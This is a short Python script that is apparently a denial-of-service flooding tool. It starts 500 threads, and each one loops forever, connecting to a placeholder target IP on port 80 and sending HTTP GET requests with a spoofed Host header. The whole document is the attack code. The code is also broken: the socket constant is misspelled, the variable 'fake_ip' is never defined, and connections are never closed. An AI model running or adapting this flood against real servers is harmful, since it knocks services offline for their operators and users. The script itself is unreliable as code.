import socket
import threading

target = "IP"                      #Target IP
#random_ip="random from cloud"
port = 80   

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STTREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: " + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
